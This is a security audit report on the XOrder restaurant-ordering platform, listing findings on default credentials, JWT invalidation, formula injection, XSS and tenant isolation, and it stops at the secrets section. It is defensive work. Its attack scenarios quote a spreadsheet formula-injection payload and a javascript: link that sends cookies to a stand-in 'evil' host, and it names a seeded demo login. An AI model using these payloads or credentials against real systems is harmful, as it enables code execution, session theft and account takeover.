# XOrder Pre-Launch Security Audit

> Auditor: Senior Application Security Engineer (adversarial pre-launch review)
> Audit date: 2026-07-25
> Scope: full monorepo `apps/{api,web,menu,landing}` + `packages/{ui,api-client,analytics}`, deployment & CI.
> Method: static source review + threat modelling + targeted test authoring. No production systems were attacked. Read-only except for the fixes documented in §14.

---

## 1. Executive summary

**Overall residual risk after fixes: LOW–MEDIUM.**

XOrder's core security architecture is **strong and deliberate**. Multi-tenant isolation — the single most important requirement — is enforced *structurally*, not per-controller: a global Eloquent `RestaurantScope` constrains every tenant-owned query to the authenticated user's `restaurant_id`, which is derived from server-side auth context and **never** from request input. `restaurant_id` is auto-stamped on insert, foreign keys accepted from clients are validated with tenant-scoped `Rule::exists(...)->where('restaurant_id', …)`, and route-model binding therefore returns 404 across tenants. This is backed by an existing, genuine test suite (`TenantIsolationTest`, `PerTenantAuthTest`, 220 feature tests). **No cross-tenant read or write vulnerability was found.**

The JWT auth model is likewise sound: HS256, secret fails closed, signature/expiry enforced, role read fresh from the DB every request (not trusted from the token), suspended/reassigned accounts cut off immediately.

The real issues clustered in **operational/launch configuration** (default credentials that could reach production) and **defense-in-depth gaps** (formula injection in exports, `javascript:`-scheme links, missing CSP, client-trusted order totals feeding analytics). The two credential issues were genuine launch blockers; both are now fixed in code with fail-closed guards and regression tests.

**Applications reviewed:** Laravel 13 API; Vue 3 SPAs — `web` (client + super-admin dashboard), `menu` (public digital menu), `landing` (marketing). **Technologies:** Laravel 13.17, PHP 8.3, PostgreSQL, stateless JWT (`firebase/php-jwt` 7.1), Intervention Image 4, PhpSpreadsheet 5.9, simple-qrcode 4.2, Firebase (FCM push), Docker Compose behind Operix nginx, GitHub Actions CI.

**Areas inspected:** auth, tenant/branch isolation, RBAC, super-admin, onboarding/plan/trial, public menu, QR, cart/order, WhatsApp, bill/review, file upload, input validation/injection, DB schema, reports/exports, frontend XSS/token storage, CORS/headers, secrets/config/deploy/CI, dependencies, rate-limiting, logging/privacy, DoS.

**Areas NOT fully verified (require deployed environment):** runtime CORS/TLS/HSTS headers as actually served, production `.env` contents on the live VPS, whether the already-live `owner@mahsoub.test` demo admin still holds the weak password, backup restore, DB network exposure, WAF/CDN. See §15.

**Findings count (post-triage):**

| Severity | Count | Fixed | Open / Accepted |
|----------|-------|-------|-----------------|
| Critical | 0 | – | – |
| High | 3 | 3 | 0 |
| Medium | 8 | 5 | 3 |
| Low | 9 | 9 | 0 |
| Informational | 4 | 0 | 4 |

**Primary (former) launch blockers — all now remediated in code:**
1. `H-01` DemoSeeder seeded a real, loginable `RESTAURANT_ADMIN` with password `password` in production.
2. `H-02` Super Admin seeded with a weak/empty default password; go-live did not enforce it.
3. `H-03` Password reset/change did not invalidate already-issued JWTs (7-day TTL).

---

## 2. Launch decision

### `LAUNCH ONLY AFTER REQUIRED FIXES`

The code-level P0 fixes (H-01, H-02, H-03) are **implemented and tested in this branch**. No Critical cross-tenant, auth-bypass, or RCE vulnerabilities were found. The launch remains conditional on two **operator runtime actions** that code cannot perform, because XOrder is already live at `https://xorder.io`:

- **RA-1 (blocker):** On the live VPS, rotate/disable the existing `owner@mahsoub.test` demo admin and confirm the Super Admin password is not `password`/empty. The seeder fix prevents *future* weak provisioning but does not retroactively change a password already written to the live database on the initial `go-live`.
- **RA-2 (blocker):** Confirm `SUPER_ADMIN_PASSWORD` and `JWT_SECRET` are set in the production `.env`. `go-live.sh` now aborts if they are empty, but an already-running deployment must be checked directly.

With H-01/H-02/H-03 fixed and RA-1/RA-2 verified on the live box, the remaining items are Medium/Low hardening suitable for fast-follow (P1/P2 in §12). Evidence for each conclusion is in §5.

---

## 3. Architecture and trust boundaries

```
                         ┌────────────────────────────────────────────┐
  Public visitor ───────▶│ apps/landing (Vue)  — marketing + lead form │
                         └────────────────────────────────────────────┘
                         ┌────────────────────────────────────────────┐
  Diner (QR/link) ──────▶│ apps/menu (Vue SPA, SEO shell via Laravel) │
                         │  public menu, cart, WhatsApp handoff, table │
                         └───────────────┬────────────────────────────┘
                                         │  /api/public/*  (no auth, throttled)
  Client admin ─────────▶ apps/web ──────┤  /api/dashboard/* (auth:jwt + role:RESTAURANT_ADMIN)
  Super admin ──────────▶ apps/web ──────┤  /api/admin/*     (auth:jwt + role:SUPER_ADMIN)
                                         ▼
                         ┌────────────────────────────────────────────┐
                         │ Laravel 13 API                             │
                         │  • Stateless JWT (Bearer) guard            │
                         │  • Global RestaurantScope (tenant boundary)│
                         │  • Feature + subscription middleware        │
                         └───────┬───────────────────┬───────────────┘
                                 ▼                   ▼
                     PostgreSQL (tenant col)   Local 'public' disk (images, re-encoded)
                                 │                   │
                                 ▼                   ▼
                          Firebase FCM (push)   WhatsApp (wa.me link built client-side)
```

**Trust boundaries & how each is enforced:**

| Boundary | Enforcement | Verdict |
|----------|-------------|---------|
| Public visitor → public menu | Slug-resolved `TenantContext::overrideId` + allow-list resources; status/visibility gating | ✅ Sound |
| Customer → order flow | Public, throttled; order stamped server-side to slug's tenant | ⚠️ Totals client-trusted (M-01) |
| Client user → dashboard | `auth:jwt` + `role:RESTAURANT_ADMIN` | ✅ Sound |
| Branch user → branch resources | *No sub-tenant branch role exists* — one `RESTAURANT_ADMIN` role per tenant sees all its branches | ℹ️ By design (§7) |
| Client admin → other client | Global `RestaurantScope`, tenant from auth only | ✅ Structurally blocked |
| Super Admin → all tenants | `role:SUPER_ADMIN`, addresses tenants by explicit id | ✅ Sound |
| Frontend → backend | JWT Bearer; every sensitive rule re-enforced server-side | ✅ Sound |
| Backend → DB | Parameterized queries; tenant scope mandatory via trait | ✅ Sound |
| Backend → storage | Auth-gated upload; content re-encoded; random ULID names | ✅ Sound |
| Backend → WhatsApp | No server call — link built client-side from server-supplied number | ✅ Sound |

---

## 4. Findings summary

| ID | Sev | Category | Finding | Affected area | Confidence | Blocker | Status |
|----|-----|----------|---------|---------------|-----------|---------|--------|
| H-01 | High | Default creds | DemoSeeder seeds real admin `owner@mahsoub.test` / `password` in prod | `database/seeders/DemoSeeder.php` | Confirmed | Yes | **Fixed** (code) + RA-1 |
| H-02 | High | Default creds | Super Admin weak/empty default password; not enforced by go-live | `config/platform.php`, `go-live.sh` | Confirmed | Yes | **Fixed** (code) + RA-2 |
| H-03 | High | Session mgmt | Password reset/change does not invalidate issued JWTs (7-day TTL) | `AppServiceProvider`, `Jwt`, `PasswordResetController` | Confirmed | Yes | **Fixed** |
| M-01 | Med | Business logic | Client-supplied order totals/line prices trusted; feed paid analytics | `PublicOrderController`, `ReportService` | Confirmed | No | **Open** (P1) |
| M-02 | Med | Injection | CSV/XLSX formula injection in report + lead exports | `ReportController`, `Admin/LeadController` | Confirmed | No | **Fixed** |
| M-03 | Med | XSS | `javascript:`-scheme in tenant social/map + CMS links bound to `href` | `apps/menu`, `apps/landing` | Confirmed | No | **Fixed** (menu); landing P1 |
| M-04 | Med | Headers | No Content-Security-Policy / `frame-ancestors` served | `docker/nginx/xorder.io.conf` | Confirmed | No | **Partial** (conservative CSP added; full script-src P1) |
| M-05 | Med | Session mgmt | JWT stored in `localStorage` (XSS-exfiltratable) | `packages/api-client` | Confirmed | No | **Accepted** (mitigated) |
| M-06 | Med | Session mgmt | No hard token revocation on logout; 7-day TTL | `AuthController`, `config/jwt.php` | Confirmed | No | **Partial** (epoch invalidation; TTL P1) |
| M-07 | Med | Auth | Account enumeration on reset-password (distinct broker messages) | `PasswordResetController` | Confirmed | No | **Fixed** |
| M-08 | Med | Abuse | Unauthenticated order/review spam with weak dedupe | `PublicOrder/ReviewController`, routes | Confirmed | No | **Open** (P1) |
| L-01 | Low | Concurrency | Branch/item plan-limit race (TOCTOU) | `Branch/MenuItemController` | Confirmed | No | **Fixed** |
| L-02 | Low | Mass assignment | `User.role`/`restaurant_id` mass-assignable (latent) | `app/Models/User.php` | Confirmed | No | **Fixed** |
| L-03 | Low | DoS | Image decompression bomb (decode before scale) | `ImageUploadService` | Confirmed | No | **Fixed** |
| L-04 | Low | Tenant leak | `clearOverride()` not in `finally` on order path | `PublicOrderController` | Confirmed | No | **Fixed** |
| L-05 | Low | Auth | Login throttle per-IP only, no per-account lockout | `routes/api.php` | Confirmed | No | **Fixed** |
| L-06 | Low | Auth | Weak password policy on reset (`min:8`, no complexity) | `PasswordResetController` | Confirmed | No | **Fixed** |
| L-07 | Low | DoS | Report date-range unbounded (self-DoS, tenant-scoped) | `ReportController` | Confirmed | No | **Fixed** |
| L-08 | Low | Tenant leak | `DeviceToken::updateOrCreate` keyed on token only | `PushTokenController` | Confirmed | No | **Fixed** |
| L-09 | Low | Privacy | `MAIL_MAILER=log` writes plaintext admin passwords to log | `.env.production.example`, `go-live.sh` | Confirmed | No | **Fixed** |
| I-01 | Info | Hygiene | `subscription_plan` free-text, not FK-validated | admin requests | Confirmed | No | Open |
| I-02 | Info | Supply chain | CI SSH host key TOFU (no pinning) | `.github/workflows/deploy.yml` | Confirmed | No | Open |
| I-03 | Info | Hardening | Container runs privileged steps as root (no `USER`) | `Dockerfile` | Confirmed | No | Open |
| I-04 | Info | Hygiene | CORS defaults to localhost dev origins if unset | `config/cors.php` | Confirmed | No | Open |

---

## 5. Detailed findings

### H-01 — DemoSeeder provisions a real, loginable admin with password `password` in production
- **Severity:** High · **Confidence:** Confirmed · **OWASP:** A07:2021 Identification & Auth Failures · **CWE-798** Hard-coded Credentials
- **Affected:** `apps/api/database/seeders/DemoSeeder.php:140-155` (the `admin()` helper), invoked at `:93` for `owner@mahsoub.test`; triggered by `go-live.sh` (`SEED_DEMO` defaults `true`).
- **Description:** The demo/showcase seeder created a genuine `RESTAURANT_ADMIN` (`owner@mahsoub.test`, tenant `mahsoub-restaurnt`) with `Hash::make('password')`. Login is only throttled 10/min, so the account is directly usable.
- **Attack scenario:** Anyone who knows or guesses the demo email logs into the live dashboard of the showcase tenant and edits its menu/branches. A prior commit (`7d74e2b`) removed other hardcoded demo passwords but missed this one.
- **Business impact:** Tenant dashboard takeover of the flagship showcase restaurant on the public production site.
- **Fix (applied):** `admin()` now seeds `Hash::make(Str::password(24))` — a fresh random secret per run — so no showcase admin is ever loginable with a guessable credential. Comment documents the rationale.
- **Regression risk:** None functional — showcase tenants exist for public menu display; no automated flow logs in as them. A Super Admin can reset the password if login is ever needed.
- **Runtime action RA-1:** The live DB may *already* contain this account with `password`. Rotate/disable it on the VPS.
- **Verify:** `php artisan db:seed --class=DemoSeeder` then assert the account cannot log in with `password`.

### H-02 — Super Admin seeded with weak/empty default password, not enforced at go-live
- **Severity:** High · **Confidence:** Confirmed · **OWASP:** A07 · **CWE-798 / CWE-1188** Insecure Default Initialization
- **Affected:** `apps/api/config/platform.php:76-80` (`'password' => env('SUPER_ADMIN_PASSWORD', 'password')`), `database/seeders/DatabaseSeeder.php`, `go-live.sh:67`, `.env.production.example:64` (blank).
- **Description:** The platform Super Admin was seeded from config whose password fell back to the literal `password`. `.env.production.example` ships the key blank; `env('…','password')` returns `''` for a present-but-blank key, so the seeded admin could get an empty-string password. `go-live.sh`'s preflight validated only `APP_KEY`, `DB_PASSWORD`, `OPERIX_PROXY_NETWORK` — nothing blocked shipping a guessable platform super-admin.
- **Attack scenario:** Operator copies the example, forgets the password, runs `go-live`; the whole-platform Super Admin (`admin@xorder.io`) is seeded with an empty or `password` credential → full multi-tenant compromise.
- **Fix (applied):**
  1. `config/platform.php` — removed the `'password'` fallback (`env('SUPER_ADMIN_PASSWORD')` only).
  2. `DatabaseSeeder` — **fails closed**: throws `RuntimeException` if the password is blank rather than seeding a guessable admin.
  3. `go-live.sh` — preflight loop now also requires `JWT_SECRET` and `SUPER_ADMIN_PASSWORD`.
  4. `.env.production.example` — added a documented `JWT_SECRET=` entry (was missing entirely).
- **Regression risk:** Low — a correctly-configured deploy (env set) is unaffected; a mis-configured one now fails loudly instead of silently insecure.
- **Runtime action RA-2:** Verify the value on the live box.
- **Verify:** `test_seeder_refuses_empty_super_admin_password` (added).

### H-03 — Password reset/change does not invalidate already-issued JWTs
- **Severity:** High · **Confidence:** Confirmed · **OWASP:** A07 · **CWE-613** Insufficient Session Expiration
- **Affected:** `app/Providers/AppServiceProvider.php` (guard), `app/Support/Jwt.php`, `config/jwt.php:29` (TTL default 7 days), `PasswordResetController`, `RestaurantProvisioningService::resetAdminPassword`.
- **Description:** The stateless guard validated `sub`, `status`, and `rid` but had no password-epoch check. A password reset rotated `remember_token` (irrelevant to JWT) but left every previously-issued token valid for up to 7 days.
- **Attack scenario:** Attacker steals a token (via the localStorage exposure M-05, a shared device, or a log leak). Victim resets their password to recover. The stolen token keeps working for up to a week — the reset provides no protection.
- **Fix (applied):** Added `users.password_changed_at` (migration); it is stamped on self-service reset, admin-initiated reset, and provisioning. The guard now rejects any token whose `iat` predates `password_changed_at`. Tokens already carry `iat`, so no token-format change was needed.
- **Regression risk:** Low — existing valid sessions keep working (rows default `NULL` → no rejection); only post-reset stale tokens die.
- **Verify:** `test_token_issued_before_password_change_is_rejected`, `test_token_issued_after_password_change_still_works`, `test_password_reset_stamps_password_changed_at` (added).

### M-01 — Client-supplied order totals & line prices are trusted and feed paid analytics
- **Severity:** Medium · **Confidence:** Confirmed · **OWASP:** A04:2021 Insecure Design · **CWE-602** Client-Side Enforcement of Server-Side Security
- **Affected:** `app/Http/Requests/Public/StoreOrderRequest.php:44-49` (`items.*.line_total`, `total` validated as free `numeric`), `app/Http/Controllers/Public/PublicOrderController.php` (`new Order($request->validated() + …)`), `app/Services/ReportService.php` (`$sales += (float)$line['line_total']`, `$agg['sales'] += (float)$order->total`).
- **Description:** Orders are free-text snapshots — there is **no menu-item-ID lookup or server re-pricing**. `line_total`/`total` are persisted verbatim and then aggregated into the paid `product_analytics` revenue reports and push-notification bodies.
- **Attack scenario:** An anonymous user POSTs to `/api/public/restaurants/{slug}/orders` (20/min/IP) with arbitrary `total` (e.g. 1,000,000) and item names/prices, silently polluting a competitor's revenue analytics and best/worst-seller reports.
- **Business impact:** Corrupted business intelligence; potential fraud/undercharging if totals are ever treated as authoritative.
- **Recommended fix:** Treat client totals as an *unverified display snapshot*. Either (a) re-price server-side from the tenant's menu items/options by ID (requires the order to reference item IDs — a schema/API change), or (b) exclude client totals from analytics and compute report figures only from server-priced data. **Not code-fixed** — this is a deliberate architecture decision (the product is WhatsApp-handoff-first, where the "order" is a message, not a transaction) and changing it risks breaking the ordering flow. Document the limitation explicitly and decide before analytics are sold as a paid feature.
- **Verify:** After a fix, assert a forged `total` does not change `reports/products-by-time`.

### M-02 — Spreadsheet formula injection in report & lead CSV/XLSX exports
- **Severity:** Medium · **Confidence:** Confirmed · **OWASP:** A03:2021 Injection · **CWE-1236**
- **Affected:** `app/Http/Controllers/Dashboard/ReportController.php` (`fputcsv`, `fromArray`), `app/Http/Controllers/Admin/LeadController.php` (lead export). Source data (order item names, lead form fields) is **unauthenticated public input**.
- **Attack scenario:** A diner submits an order line named `=cmd|'/c calc'!A1` (or a DDE/HYPERLINK exfil payload). When the restaurant admin — or, via a lead, the Super Admin — opens the export in Excel/LibreOffice, the formula can execute.
- **Fix (applied):** New `App\Support\CsvSafe` prefixes any cell beginning with `= + - @ \t \r` with a leading apostrophe, applied to both CSV and XLSX rows in both exporters.
- **Verify:** `test_csv_safe_neutralises_formula_prefixes` (added).

### M-03 — `javascript:`-scheme URLs in tenant/CMS links bound to `href`
- **Severity:** Medium · **Confidence:** Confirmed · **OWASP:** A03 · **CWE-79** (DOM XSS)
- **Affected:** `apps/menu/src/components/Footer.vue` (`social_links`), `apps/menu/src/components/BranchesPage.vue` (`map_url`) — tenant-admin-controlled, rendered on the **public** menu; `apps/landing/src/LandingView.vue:252-253` (`hero.primary_link/secondary_link`) — super-admin CMS.
- **Description:** URLs were bound to `:href` with no scheme allow-listing. (Backend validates `social_links.*`/`map_url` with the bare `url` rule, which rejects most but not all `javascript:` forms — defense-in-depth was missing on the render side.)
- **Attack scenario:** A malicious/compromised restaurant admin sets a social link to `javascript:fetch('//evil?c='+document.cookie)`; a diner who taps it executes attacker JS in the menu origin.
- **Fix (applied):** New `apps/menu/src/lib/safeUrl.js` allows only `http(s)/mailto/tel` and returns `null` otherwise; applied in `Footer.vue` (unsafe links dropped) and `BranchesPage.vue`. **Remaining (P1):** apply the same guard to the landing hero-link computeds (super-admin-controlled, so lower risk — effectively self-XSS of the platform operator).
- **Verify:** Set a `javascript:` social link and confirm the anchor is not rendered.

### M-04 — No Content-Security-Policy / `frame-ancestors` at the serving layer
- **Severity:** Medium · **Confidence:** Confirmed · **CWE-1021 / CWE-693**
- **Affected:** `docker/nginx/xorder.io.conf` — served HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, but no CSP.
- **Description:** With the JWT in localStorage (M-05) there was no CSP backstop to block inline-script execution or exfiltration.
- **Fix (applied, partial):** Added a **conservative** CSP — `frame-ancestors 'self'; object-src 'none'; base-uri 'self'` — plus `Permissions-Policy`. This blocks clickjacking, plugin embedding, and `<base>` hijacking without a `script-src` (which risks breaking the Vite bundles + Firebase/GA4 and must be tuned per-app under test). **Remaining (P1):** author and test a full `script-src`/`connect-src` policy against all three apps' analytics domains.

### M-05 — JWT stored in `localStorage`
- **Severity:** Medium · **Confidence:** Confirmed · **CWE-522**
- **Affected:** `packages/api-client/src/api.js` (`localStorage` key `xorder_token`).
- **Description:** Inherent to the JWT-in-localStorage model: any script execution in the dashboard origin can exfiltrate the token (no `HttpOnly`).
- **Status:** **Accepted with mitigations.** Blast radius is now capped by H-03 (post-reset invalidation), the conservative CSP (M-04), and the render-side scheme guard (M-03). Recommended further mitigation: shorter TTL + refresh tokens (M-06), or in-memory token + refresh cookie.

### M-06 — No hard token revocation on logout; 7-day TTL
- **Severity:** Medium · **Confidence:** Confirmed · **CWE-613**
- **Affected:** `AuthController::logout` (audit-log only), `config/jwt.php:29`.
- **Description:** Stateless tokens cannot be revoked before `exp`; logout does not invalidate. 7 days is a large window for a bearer credential usable from any IP.
- **Status:** **Partially mitigated** by H-03 (password change now invalidates). **Remaining (P1):** reduce default TTL to 15–60 min with refresh tokens, or maintain a `jti` blocklist keyed on logout (cache TTL = remaining token life).

### M-07 — Account enumeration on reset-password
- **Severity:** Medium · **Confidence:** Confirmed · **CWE-204**
- **Affected:** `PasswordResetController::reset` returned `__($status)`, which distinguishes `passwords.user` ("no such user") from `passwords.token` ("bad token").
- **Fix (applied):** All failure statuses now collapse to one generic 422 message (`xorder.errors.password_reset_failed`, EN + AR). `forgot()` was already constant-response.
- **Verify:** `test_password_reset_failure_is_generic_and_does_not_enumerate` (added).

### M-08 — Unauthenticated order/review spam with weak dedupe
- **Severity:** Medium · **Confidence:** Confirmed · **OWASP:** A04 · **CWE-799**
- **Affected:** `routes/api.php` (orders `throttle:20,1`, reviews `throttle:10,1`), `PublicReviewController` (per-session dedupe only fires when a session token is supplied).
- **Attack scenario:** A competitor floods a restaurant's order feed and review inbox with junk by slug, degrading dashboards and triggering FCM push floods. Slug-only reviews have no per-session guard.
- **Recommended fix (P1):** Require a valid table `session_token` (or a CAPTCHA) for slug-only order/review submission; tighten per-IP + per-restaurant throttles. **Not code-fixed** (product decision — some tenants take orders without table QR).

### L-01 — Branch/item plan-limit race (TOCTOU)
- **Severity:** Low · **Confidence:** Confirmed · **CWE-362**
- **Affected:** `BranchController::store`, `MenuItemController::store` (check-then-create, no lock).
- **Fix (applied):** Both wrap the limit check + insert in a `DB::transaction` that first `lockForUpdate()`s the tenant's `restaurants` row, serializing concurrent creates so the plan cap holds. (On PostgreSQL the row lock is effective; on the sqlite test DB it is a no-op but correctness under sequential load is unchanged.)

### L-02 — `User.role` / `restaurant_id` mass-assignable (latent)
- **Severity:** Low · **Confidence:** Confirmed · **CWE-915**
- **Affected:** `app/Models/User.php` `$fillable`.
- **Description:** No reachable exploit today (no user-CRUD endpoint; provisioning hardcodes the role), but any future `User::create($request->all())` would allow self-promotion to `SUPER_ADMIN` or tenant-hop.
- **Fix (applied):** Removed `role` and `restaurant_id` from `$fillable`; all trusted call sites (provisioning, both seeders) set them via `forceCreate`/`forceFill`. Factories are unaffected (they run unguarded).
- **Verify:** `test_role_and_restaurant_id_are_not_mass_assignable` (added).

### L-03 — Image decompression bomb
- **Severity:** Low · **Confidence:** Confirmed · **CWE-409**
- **Affected:** `ImageUploadService::store` decoded the full bitmap before `scaleDown`; the 4 MB byte cap does not bound decoded pixel area.
- **Fix (applied):** `getimagesize()` header check rejects sources exceeding `max_source_dimension` (default 10000px) before the full decode.

### L-04 — `clearOverride()` not in `finally` on the order path
- **Severity:** Low · **Confidence:** Confirmed · **CWE-459**
- **Affected:** `PublicOrderController::store` pinned the tenant override and only released it on the success path.
- **Fix (applied):** Wrapped in `try { … } finally { TenantContext::clearOverride(); }`, matching `PublicMenuService`. Harmless under PHP-FPM, prevents tenant-pin leakage under Octane/queue reuse.

### L-05 — Login throttle per-IP only
- **Severity:** Low · **Confidence:** Confirmed · **CWE-307**
- **Affected:** `routes/api.php` login route (`throttle:10,1` — per-IP only).
- **Description:** A plain per-IP throttle does not slow a distributed brute force against a single known account.
- **Fix (applied):** Registered a named `login` rate limiter (`AppServiceProvider::registerRateLimiters`) that layers a per-`(username, IP)` limit (5/min) on top of the per-IP limit (10/min); the route now uses `throttle:login`. Keying on username+IP (not username alone) prevents an attacker locking a victim out by hammering their username.
- **Verify:** `test_login_is_rate_limited_per_account` (added).

### L-06 — Weak reset password policy
- **Severity:** Low · **Confidence:** Confirmed · **CWE-521**
- **Affected:** `PasswordResetController::reset` (`PasswordRule::min(8)`).
- **Fix (applied):** Strengthened to `min(12)->mixedCase()->numbers()`. (`uncompromised()` / HIBP breach check noted as an opt-in further step — deliberately not enabled to avoid a network dependency in the reset path.)
- **Verify:** `test_reset_rejects_weak_password` (added).

### L-07 — Unbounded report date range (self-DoS)
- **Severity:** Low · **Confidence:** Confirmed · **CWE-770**
- **Affected:** `ReportController::validateFilters`.
- **Fix (applied):** `date_to` now requires `after_or_equal:date_from`; when both dates are supplied the span is capped at `platform.report_max_range_days` (default 366) with a 422 otherwise, bounding the in-memory aggregation. Tenant-scoped, so this was self-inflicted, but the cap removes the abuse vector.
- **Verify:** `test_report_rejects_excessively_large_date_range`, `test_report_rejects_inverted_date_range` (added).

### L-08 — `DeviceToken` cross-user hijack
- **Severity:** Low · **Confidence:** Confirmed · **CWE-639**
- **Affected:** `PushTokenController::store` (`updateOrCreate` keyed on globally-unique `token`).
- **Description:** An admin who obtained another tenant's FCM token (a device credential not otherwise exposed by the app) could POST it and re-point that device's push routing.
- **Fix (applied):** `store` now refuses (no-op success, no oracle) when the token is already registered to a **different** user; legitimate device hand-off clears the old token via the logout `destroy` call first. Ownership is always derived from the authenticated user, never request input.
- **Verify:** `test_device_token_cannot_be_hijacked_by_another_user` (added).

### L-09 — Plaintext admin passwords written to log with `MAIL_MAILER=log`
- **Severity:** Low · **Confidence:** Confirmed · **CWE-532**
- **Affected:** `.env.production.example` shipped `MAIL_MAILER=log`; provisioning/reset emails carry the generated plaintext password.
- **Fix (applied):** The production template now defaults to `smtp` (with a security note that `log` writes cleartext credentials to disk), and `go-live.sh` emits a loud non-fatal warning if `MAIL_MAILER=log`. Ensuring a real SMTP transport before provisioning remains an operator responsibility.

### I-01…I-04 — Informational
- **I-01** `subscription_plan` is free-text (`nullable|string`) not `Rule::exists('plans','name')`; a typo silently grants unlimited limits. Super-admin-only.
- **I-02** CI uses `ssh-keyscan` TOFU; add a pinned `SSH_KNOWN_HOSTS` secret.
- **I-03** Container has no `USER` directive (php-fpm master as root); consider non-root.
- **I-04** `config/cors.php` defaults to `localhost:5173/5174` if `CORS_ALLOWED_ORIGINS` unset — availability, not security (credentials disabled, Bearer auth). Set explicitly in prod.

---

## 6. Tenant isolation matrix

Tenant column: `restaurant_id`. Filter location: global `RestaurantScope` (auto-applied by `BelongsToRestaurant`), sourced from `TenantContext` = authenticated user's `restaurant_id` (never request input). Cross-tenant route-model binding → 404.

| Resource | Tenant-owned | Branch-owned | Tenant filter | Ownership verified | Cross-tenant test | Result |
|----------|-------------|--------------|---------------|--------------------|-------------------|--------|
| Restaurant (tenant) | is-tenant | – | admin by explicit id | role:SUPER_ADMIN | `TenantIsolationTest` | ✅ |
| User | manual (`restaurant_id`) | – | login scoped per-tenant | provisioning-only | `PerTenantAuthTest` | ✅ |
| Branch | trait | – | RestaurantScope | binding 404 | ✅ | ✅ |
| Category | trait | – | RestaurantScope | binding 404 | `TenantIsolationTest` | ✅ |
| MenuItem | trait | via category | RestaurantScope + scoped FK | binding 404, FK 422 | `TenantIsolationTest` | ✅ |
| Option/OptionGroup | trait | – | RestaurantScope | scoped | ✅ | ✅ |
| Combo/ComboGroup(Item) | trait | – | RestaurantScope + scoped FK | scoped | ✅ | ✅ |
| Order | trait | via session | RestaurantScope; stamped server-side | ✅ | `OrderTest` | ✅ (totals M-01) |
| Customer/CustomerAddress | trait | – | RestaurantScope | scoped upsert | ✅ | ✅ |
| DiningArea/DiningTable | trait | – | RestaurantScope + scoped FK | binding 404 | `TableTest` | ✅ |
| MenuSession | trait | – | token-keyed, tenant-scoped | ✅ | `PublicTableTest` | ✅ |
| BillRequest | trait | via session | RestaurantScope; token lookups scoped | ✅ | `BillRequestTest` | ✅ |
| InternalReview / notes | trait | – | RestaurantScope; slug/session scoped | ✅ | `InternalReviewTest` | ✅ |
| Notification | trait | – | RestaurantScope (incl. binding) | binding 404 | `NotificationTest` | ✅ |
| MenuViewDaily (analytics) | trait | – | RestaurantScope | ✅ | `InsightsTest` | ✅ |
| RestaurantFeature | trait | – | RestaurantScope | ✅ | `RestaurantFeatureTest` | ✅ |
| DeviceToken | manual | – | `user_id`/`restaurant_id` cols | destroy scoped; store token-keyed | – | ⚠️ L-08 |
| AuditLog | none (by design) | – | SUPER_ADMIN read-only, cross-tenant intended | endpoint role-gated | – | ✅ (intentional) |
| Plan / LandingContent / Lead | global (not tenant) | – | SUPER_ADMIN only | role-gated | `PlanTest`/`LeadTest` | ✅ |
| Uploaded files | folder enum + random ULID | – | auth-gated; not path-partitioned | random name prevents overwrite | – | ✅ |

---

## 7. Roles and permissions matrix

XOrder has **two** roles only: `SUPER_ADMIN` and `RESTAURANT_ADMIN`. There is no distinct branch-manager/staff/read-only role — a `RESTAURANT_ADMIN` manages all of its tenant's branches. "Branch isolation" between sub-users therefore does not exist by design (documented, not a defect). Customers/public are unauthenticated.

| Action | Public | RESTAURANT_ADMIN | SUPER_ADMIN |
|--------|--------|------------------|-------------|
| View public menu | ✅ | ✅ | ✅ |
| Submit order / review / bill request | ✅ (throttled) | ✅ | ✅ |
| Manage own menu/categories/items/combos | ❌ | ✅ (subscription-gated writes) | via impersonation? (none) |
| Create branch | ❌ | ✅ if `multi_branch` + within plan limit | ❌ |
| Edit own restaurant profile | ❌ | ✅ (no subscription/status/plan fields) | ✅ (full) |
| View own orders/reviews/reports | ❌ | ✅ (feature-gated) | ❌ (separate admin insights) |
| Create/suspend/delete client | ❌ | ❌ | ✅ |
| Change plan / subscription / trial dates | ❌ | ❌ (fields excluded from profile request) | ✅ |
| Manage plans catalog | ❌ | ❌ | ✅ |
| Landing CMS / leads / audit logs | ❌ | ❌ | ✅ |
| Assign SUPER_ADMIN role | ❌ (no field accepts it) | ❌ | provisioning code only |

Verified: `UpdateRestaurantProfileRequest` deliberately omits slug/status/subscription/plan; `->update($request->validated())` cannot reach those columns. Provisioning/registration accept no `role` field. Trial dates are server-computed.

---

## 8. Endpoint authorization matrix (representative)

Auth: `jwt` = Bearer JWT required. Tenant scope via global `RestaurantScope`. All `/dashboard/*` also require `role:RESTAURANT_ADMIN`; all `/admin/*` require `role:SUPER_ADMIN`.

| Method | Endpoint | Auth | Role | Tenant-scoped | Ownership | Rate-limited | Validated | Notes |
|--------|----------|------|------|---------------|-----------|--------------|-----------|-------|
| POST | /auth/login | none | – | per-subdomain | – | 10/min | ✅ | no enumeration |
| POST | /auth/forgot-password | none | – | – | – | 5/min | ✅ | constant response |
| POST | /auth/reset-password | none | – | – | token | 5/min | ✅ | M-07 fixed |
| GET | /auth/me | jwt | any | self | ✅ | – | – | |
| POST | /auth/logout | jwt | any | self | ✅ | – | – | M-06 (no hard revoke) |
| GET/POST/PUT/DELETE | /admin/restaurants* | jwt | SUPER_ADMIN | by id | ✅ | reset 10/min | ✅ | |
| PATCH | /admin/restaurants/{r}/subscription | jwt | SUPER_ADMIN | by id | ✅ | – | ✅ | trial server-set |
| GET | /admin/leads/export | jwt | SUPER_ADMIN | global | – | – | – | M-02 fixed |
| POST | /dashboard/branches | jwt | RESTAURANT_ADMIN | ✅ | ✅ | – | ✅ | feature:multi_branch, L-01 fixed |
| POST | /dashboard/items | jwt | RESTAURANT_ADMIN | ✅ | scoped FK | – | ✅ | L-01 fixed |
| GET | /dashboard/reports/*/export | jwt | RESTAURANT_ADMIN | ✅ | ✅ | – | ✅ | feature:product_analytics, M-02 fixed |
| POST | /uploads/image | jwt | any admin | not path-partitioned | random name | 60/min | ✅ | content re-encoded, L-03 fixed |
| GET | /public/restaurants/{slug}/menu | none | – | slug→override | allow-list | 120/min | – | ✅ |
| POST | /public/restaurants/{slug}/orders | none | – | slug→stamped | – | 20/min | ✅ | M-01, M-08 |
| POST | /public/restaurants/{slug}/reviews | none | – | slug→stamped | session dedupe | 10/min | ✅ | M-08 |
| GET | /public/tables/{token} | none | – | token→tenant | token | 120/min | – | strong token |
| POST | /public/sessions/{token}/bill-requests | none | – | session→tenant | token | 20/min | ✅ | cooldown |
| POST | /public/signup | none | – | – | – | 5/10min | ✅ | 404 unless SELF_SERVE_SIGNUP |

---

## 9. Secrets review

